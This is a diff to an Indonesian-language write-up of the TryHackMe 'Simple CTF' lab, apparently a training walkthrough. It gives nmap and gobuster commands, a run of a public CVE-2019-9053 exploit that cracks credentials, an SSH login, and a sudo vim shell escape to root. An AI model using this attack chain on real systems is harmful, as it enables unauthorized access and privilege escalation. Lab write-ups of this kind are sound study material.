@@ -3,7 +3,11 @@
 - IP Machine: 10.10.128.226
 
 ## Port Scanning
-- Scan menggunakan tool nmap dengan perintah: `nmap -sC -sV <IP Machine>`
+- Lakukan port scanning dengan tool `nmap`
+```sh
+nmap -sC -sV <IP Machine>
+```
+- Berikut ini adalah hasil port scanning
 ```sh
 ┌──(root㉿kali)-[/home/kali]
 └─# nmap -sC -sV 10.10.128.226   
@@ -49,7 +53,10 @@ Nmap done: 1 IP address (1 host up) scanned in 56.37 seconds
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Simple%20CTF/assets/sc%201.JPG)
 
 ## Gobuster
-- Cari directory web menggunakan tool gobuster dengan perintah `gobuster dir -u http://<IP_Machine> -w <wordlists>`
+- Cari halaman web tersembunyi dengan tool `gobuster`
+```sh
+gobuster dir -u http://<IP_Machine> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+```
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Simple%20CTF/assets/sc%202.JPG)
 
@@ -78,7 +85,7 @@ wget https://raw.githubusercontent.com/e-renna/CVE-2019-9053/master/exploit.py
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Simple%20CTF/assets/sc%207.JPG)
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Simple%20CTF/assets/sc%208.JPG)
 
-- Jalankan program exploit.py dengan perintah sebagai berikut:
+- Sekarang kita jalankan script `exploit.py` dengan menggunakan wordlists dari seclists yaitu `best110.txt`
 ```sh
 python3 exploit.py -u http://<IP_Machine>/simple --crack -w /usr/share/seclists/Passwords/Common-Credentials/best110.txt
 ```
@@ -86,36 +93,51 @@ python3 exploit.py -u http://<IP_Machine>/simple --crack -w /usr/share/seclists/
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Simple%20CTF/assets/sc%209.JPG)
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Simple%20CTF/assets/sc%2010.JPG)
 
-- Proses exploit berhasil, sekarang kita bisa menggunakan username dan password tersebut untuk mengakses SSH dengan perintah `ssh mitch@IP_Machine -p 2222`
+- Proses exploit berhasil dan kita menemukan username dan password. Sekarang kita coba gunakan username dan password tersebut untuk mengakses SSH
+```sh
+ssh mitch@IP_Machine -p 2222
+```
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Simple%20CTF/assets/sc%2011.JPG)
 
-- Setelah berhasil login, disana terdapat file **user.txt** yang berisi user flag. Baca isi dengan perintah `cat user.txt`
+- Setelah berhasil login, disana terdapat file **user.txt** yang berisi user flag
+```sh
+cat user.txt
+```
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Simple%20CTF/assets/sc%2012.JPG)
 
 - Pada directory home, selain ditemukan directory **mitch** juga ditemukan directory **sunbath**
+```sh
+ls /home
+```
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Simple%20CTF/assets/sc%2013.JPG)
 
 
 ## Privilege Escalation
-- Gunakan perintah `sudo -l` untuk melihat perintah yang bisa dijalankan tanpa akses root. Disini kita dapat menjalankan **vim** dengan perintah **sudo**
+- Sekarang kita lakukan pengecekan, apakah user `mitch` punya akses ke sudo
+```sh
+sudo -l
+```
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Simple%20CTF/assets/sc%2014.JPG)
 
-- Kita bisa memanfaatkan script di https://gtfobins.github.io/gtfobins/vim/ untuk mendapatkan akses root melalui vim
+- Setelah dicek, user `mitch` punya akses perintah `sudo` untuk menjalankan aplikasi **vim**. Kita bisa memanfaatkan script di https://gtfobins.github.io/gtfobins/vim/ untuk mendapatkan akses root melalui vim
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Simple%20CTF/assets/sc%2015.JPG)
 
-- Jalankan script diatas untuk mendapatkan akses root
+- Jalankan script diatas untuk mendapatkan akses user root
 ```sh
 sudo vim -c ':!/bin/sh'
 ```
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Simple%20CTF/assets/sc%2016.JPG)
 
-- Sekarang kita tinggal membaca file root.txt sebagai root flag dengan perintah `cat /root/root.txt`
+- Sekarang kita tinggal membaca file `root.txt` sebagai root flag yang berada di direktori **/root**
+```sh
+cat /root/root.txt
+```
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Simple%20CTF/assets/sc%2017.JPG)
 
